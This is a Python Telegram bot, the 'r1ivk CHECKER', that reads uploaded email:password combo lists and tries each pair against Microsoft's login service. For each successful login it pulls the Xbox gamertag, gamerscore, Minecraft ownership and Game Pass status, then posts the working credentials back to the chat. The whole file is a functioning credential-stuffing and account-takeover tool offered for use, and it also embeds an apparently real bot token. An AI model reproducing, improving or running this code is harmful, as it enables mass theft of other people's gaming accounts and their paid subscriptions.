# -*- coding: utf-8 -*-
"""
r1ivk CHECKER - XBOX + MINECRAFT (TELEGRAM BOT VERSION)
Owner: r1ivk
"""

import os
import re
import time
import asyncio
import logging
from urllib.parse import urlparse, parse_qs
import aiohttp
import requests
import urllib3
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

urllib3.disable_warnings()

# =================== CONFIGURATION ===================
BOT_TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Dictionary to track active tasks per user to prevent multi-spams
active_scans = {}

# =================== FILE HELPERS ===================
def setup_folders():
    if not os.path.exists("XBOX_RESULT"):
        os.makedirs("XBOX_RESULT")
    if not os.path.exists("r1ivk_Database"):
        os.makedirs("r1ivk_Database")

def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

# =================== CHECKER LOGIC (ASYNC) ===================
async def check_single_account(email, password):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    timeout = aiohttp.ClientConnectorTimeout(total=25)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for _ in range(2):
            try:
                sftag_url = (
                    "https://login.live.com/oauth20_authorize.srf"
                    "?client_id=00000000402B5328"
                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                    "&display=touch&response_type=token&locale=en"
                )
                async with session.get(sftag_url, ssl=False) as resp:
                    text = await resp.text()

                sftag = extract_ppft(text)
                url_post = extract_url_post(text)

                if not sftag or not url_post:
                    return {"status": "bad"}

                login_data = {
                    'login': email, 'loginfmt': email, 'passwd': password,
                    'PPFT': sftag, 'type': '11', 'NewUser': '1', 'LoginOptions': '3', 'i19': '0',
                }
                post_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': sftag_url, 'Origin': 'https://login.live.com'}
                
                async with session.post(url_post, data=login_data, headers=post_headers, allow_redirects=True, ssl=False) as login_req:
                    login_text = (await login_req.text()).lower()
                    login_url = str(login_req.url)

                ms_token = None
                if 'access_token' in login_url:
                    ms_token = parse_qs(urlparse(login_url).fragment).get('access_token', [None])[0]
                elif 'access_token' in login_text:
                    token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                    if token_match:
                        ms_token = token_match.group(1)
                elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect"]):
                    return {"status": "bad"}
                elif any(x in login_text for x in ["recover", "identity/confirm", "locked", "help us protect", "verify your identity", "security challenge", "two-step"]):
                    return {"status": "twofa"}

                if not ms_token:
                    return {"status": "bad"}

                xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
                xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
                
                async with session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, ssl=False) as xb_req:
                    if xb_req.status != 200:
                        return {"status": "error"}
                    xb_data = await xb_req.json()
                    xb_token = xb_data['Token']
                    uhs = xb_data['DisplayClaims']['xui'][0]['uhs']

                gamertag = "N/A"
                gamerscore = "0"
                gscore_int = 0

                try:
                    xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                    async with session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, ssl=False) as xsts_xb_req:
                        if xsts_xb_req.status == 200:
                            xsts_xb_token = (await xsts_xb_req.json())['Token']
                            async with session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                                   headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, ssl=False) as prof_req:
                                if prof_req.status == 200:
                                    settings = (await prof_req.json()).get('profileUsers', [{}])[0].get('settings', [])
                                    for s in settings:
                                        if s['id'] == 'Gamertag': gamertag = s['value']
                                        if s['id'] == 'Gamerscore': 
                                            gamerscore = s['value']
                                            try: gscore_int = int(gamerscore)
                                            except: gscore_int = 0
                except:
                    pass

                has_gp = False
                has_mc = False
                gp_type = ""
                mc_ent_text = ""

                try:
                    xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                    async with session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, ssl=False) as xsts_mc_req:
                        if xsts_mc_req.status == 200:
                            xsts_mc_token = (await xsts_mc_req.json())['Token']
                            async with session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                                   headers={'Content-Type': 'application/json'}, ssl=False) as mc_auth:
                                if mc_auth.status == 200:
                                    mc_token = (await mc_auth.json()).get('access_token')
                                    if mc_token:
                                        async with session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, ssl=False) as ent_req:
                                            if ent_req.status == 200:
                                                mc_ent_text = await ent_req.text()
                except:
                    pass

                if 'product_game_pass_ultimate' in mc_ent_text:
                    gp_type = "Game Pass Ultimate"
                    has_gp = True
                elif 'product_game_pass_pc' in mc_ent_text:
                    gp_type = "PC Game Pass"
                    has_gp = True
                elif 'product_game_pass_console' in mc_ent_text:
                    gp_type = "Xbox Game Pass Console"
                    has_gp = True

                has_mc = 'product_minecraft' in mc_ent_text

                hit_type = "hit"
                if has_gp: hit_type = "Game Pass"
                elif has_mc: hit_type = "Minecraft"
                elif gscore_int > 0: hit_type = "G-Score"
                else: hit_type = "Free/Clean"

                return {
                    "status": "hit",
                    "type": hit_type,
                    "email": email,
                    "password": password,
                    "gamertag": gamertag,
                    "gamerscore": gamerscore,
                    "minecraft": 'Yes' if has_mc else 'No',
                    "gamepass": gp_type if has_gp else 'No'
                }

            except Exception:
                await asyncio.sleep(0.5)
        
        return {"status": "error"}

# =================== TELEGRAM BOT HANDLERS ===================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    welcome_msg = (
        f"⚡ *r1ivk CHECKER v2.0 - TELEGRAM BOT* ⚡\n\n"
        f"Welcome, *{user_name}*!\n"
        f"Owner: *r1ivk*\n\n"
        f"Send me your combo file (`.txt` format with `email:password` structure) to start live scanning for Xbox & Minecraft accounts.\n\n"
        f"Commands:\n"
        f"• Send `.txt` file directly to start check.\n"
        f"• /stop - Stop your current running scan."
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_scans:
        active_scans[user_id] = False
        await update.message.reply_text("🛑 *Scan stopped successfully by r1ivk bot.*", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ No active scans found to stop.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_scans and active_scans[user_id]:
        await update.message.reply_text("⚠️ You already have a running scan! Please wait for it to finish or type /stop.")
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a valid `.txt` combo file!")
        return

    file = await context.bot.get_file(document.file_id)
    file_path = f"r1ivk_Database/{user_id}_combo.txt"
    await file.download_to_drive(file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    total = len(combos)
    if total == 0:
        await update.message.reply_text("❌ The uploaded file is empty or has invalid formatting (`email:password`).")
        return

    setup_folders()
    active_scans[user_id] = True

    status_message = await update.message.reply_text(
        f"🚀 *r1ivk Checker Initialized!*\n"
        f"📁 Total Combos: `{total}`\n"
        f"⏳ Status: Starting live scan...", parse_mode="Markdown"
    )

    checked = 0
    hits = 0
    bad = 0
    twofa = 0
    errors = 0
    start_time = time.time()

    semaphore = asyncio.Semaphore(15) # عدد الثريدز المتزامن داخل البوت

    async def bound_check(combo):
        nonlocal checked, hits, bad, twofa, errors
        if not active_scans.get(user_id, False):
            return
        
        parts = combo.split(':')
        email = parts[0].strip()
        password = ':'.join(parts[1:]).strip()

        async with semaphore:
            res = await check_single_account(email, password)

        checked += 1
        status = res.get("status")

        if status == "hit":
            hits += 1
            hit_text = (
                f"🔥 *r1ivk CHECKER - NEW HIT!*\n\n"
                f"📧 *Email:* `{res['email']}`\n"
                f"🔑 *Password:* `{res['password']}`\n"
                f"🎮 *Gamertag:* `{res['gamertag']}`\n"
                f"🏆 *Gamerscore:* `{res['gamerscore']}`\n"
                f"⛏️ *Minecraft:* `{res['minecraft']}`\n"
                f"🟢 *Game Pass:* `{res['gamepass']}`\n"
                f"__________________________________"
            )
            await context.bot.send_message(chat_id=update.effective_chat.id, text=hit_text, parse_mode="Markdown")
        elif status == "bad":
            bad += 1
        elif status == "twofa":
            twofa += 1
        else:
            errors += 1

        # تحديث الرسالة كل 10 حسابات مفحوصة لتفادي حظر التلجرام
        if checked % 10 == 0 or checked == total:
            elapsed = time.time() - start_time
            cpm = int((checked / elapsed) * 60) if elapsed > 1 else 0
            pct = (checked / total) * 100
            
            progress_text = (
                f"⚡ *r1ivk CHECKER - LIVE STATUS* ⚡\n\n"
                f"📊 Progress: `{checked}/{total}` (`{pct:.1f}%`)\n"
                f"🔥 Hits: `{hits}`\n"
                f"❌ Bad: `{bad}`\n"
                f"🔒 2FA: `{twofa}`\n"
                f"⚠️ Errors: `{errors}`\n"
                f"🚀 CPM: `{cpm}`\n"
                f"👤 Owner: `r1ivk`"
            )
            try:
                await status_message.edit_text(progress_text, parse_mode="Markdown")
            except:
                pass

    tasks = [bound_check(c) for c in combos]
    
    # تنفيذ الفحص بشكل دفعات متزامنة
    chunk_size = 15
    for i in range(0, len(tasks), chunk_size):
        if not active_scans.get(user_id, False):
            break
        await asyncio.gather(*tasks[i:i+chunk_size])

    active_scans[user_id] = False
    await update.message.reply_text(
        f"✅ *Scan Completed Successfully!*\n\n"
        f"📊 Total Checked: `{checked}`\n"
        f"🔥 Total Hits: `{hits}`\n"
        f"❌ Total Bad: `{bad}`\n"
        f"🔒 Total 2FA: `{twofa}`\n"
        f"👤 Owner: `r1ivk`", parse_mode="Markdown"
    )

def main():
    setup_folders()
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🤖 r1ivk Telegram Bot is running successfully...")
    application.run_polling()

if __name__ == "__main__":
    main()
